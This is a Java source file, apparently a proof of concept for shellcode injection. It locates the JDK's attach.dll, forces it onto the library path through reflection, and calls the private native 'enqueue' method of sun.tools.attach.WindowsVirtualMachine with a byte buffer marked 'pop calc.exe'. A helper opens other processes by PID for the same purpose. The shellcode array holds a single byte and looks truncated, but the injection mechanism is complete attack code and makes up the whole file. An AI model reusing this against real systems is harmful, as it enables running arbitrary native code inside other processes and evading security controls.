
import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class ThreadMain   {
    static String realPath = "";
    static boolean ifFind = false;
    public static String findFile(String name, File file)
    {


        File[] list = file.listFiles();
        if(list != null)
            for (File fil : list)
            {
//                System.out.println(fil.getName());
                if (fil.isDirectory())
                {
                    findFile(name,fil);
                }
                else if (name.equalsIgnoreCase(fil.getName()))
                {
                    //System.out.println(fil.getAbsoluteFile());
                    ifFind = true;
                    realPath = fil.getAbsolutePath();

                }
                if (ifFind){
                    break;
                }
            }

        return realPath;

    }

    public static void main(String[] args) throws Exception {
        File javaHome = new File(System.getProperty("java.home"));
//        System.out.println(javaHome);
//        System.out.println(javaHome.getAbsoluteFile().getParent());

        String realPath = findFile("attach.dll", new File(javaHome.getAbsoluteFile().getParent()));
        System.out.print(realPath);
        String parentPath = new File(realPath).getParent();
        System.out.println(parentPath);
        System.setProperty("java.library.path", parentPath);
        Field fieldSysPath = ClassLoader.class.getDeclaredField("sys_paths");
        fieldSysPath.setAccessible(true);
        fieldSysPath.set(null, null);

        System.loadLibrary("attach");



        Class cls=Class.forName("sun.tools.attach.WindowsVirtualMachine");
        for (Method m:cls.getDeclaredMethods())
        {
            if (m.getName().equals("enqueue"))
            {
                long hProcess=-1;
                //hProcess=getHandleByPid(30244);
                byte buf[] = new byte[]   //pop calc.exe
                        {
                                (byte) 0xfc
                        };

                String cmd="load";String pipeName="test";
                m.setAccessible(true);
                Object result=m.invoke(cls,new Object[]{hProcess,buf,cmd,pipeName,new Object[]{}});
                System.out.println("result:"+result);
            }


        }
        Thread.sleep(4000);
    }
    public static long getHandleByPid(int pid)
    {
        Class cls= null;
        long hProcess=-1;
        try {
            cls = Class.forName("sun.tools.attach.WindowsVirtualMachine");
            for (Method m:cls.getDeclaredMethods()) {
                if (m.getName().equals("openProcess"))
                {
                    m.setAccessible(true);
                    Object result=m.invoke(cls,pid);
                    System.out.println("pid :"+result);
                    hProcess=Long.parseLong(result.toString());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return hProcess;
    }
}
